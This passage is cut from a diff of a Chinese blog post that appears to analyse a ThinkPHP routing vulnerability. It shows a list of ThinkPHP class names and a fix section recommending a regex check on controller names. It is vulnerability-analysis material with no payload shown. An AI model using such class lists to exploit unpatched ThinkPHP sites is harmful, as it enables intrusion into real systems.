</span><br><span class="line">think\Route </span><br><span class="line">think\route\Rule </span><br><span class="line">think\route\RuleGroup </span><br><span class="line">think\route\Domain </span><br><span class="line">think\route\RuleItem </span><br><span class="line">think\route\RuleName </span><br><span class="line">think\route\Dispatch </span><br><span class="line">think\route\dispatch\Url </span><br><span class="line">think\route\dispatch\Module </span><br><span class="line">think\Middleware </span><br><span class="line">think\Cookie </span><br><span class="line">think\View </span><br><span class="line">think\view\driver\Think </span><br><span class="line">think\Template </span><br><span class="line">think\template\driver\File </span><br><span class="line">think\Log </span><br><span class="line">think\log\driver\File </span><br><span class="line">think\Session </span><br><span class="line">think\Debug </span><br><span class="line">think\Cache </span><br><span class="line">think\cache\Driver </span><br><span class="line">think\cache\driver\File </span><br></pre></td></tr></table></figure></div>
 
 
 
 <h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>使用正则表达式对控制器名进行合法性校验</p>
-<pre class="line-numbers language-none"><code class="language-none">^[A-Za-z](\w)*$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[A-Za-z](\w)*$</span><br></pre></td></tr></table></figure></div>
 
 
 
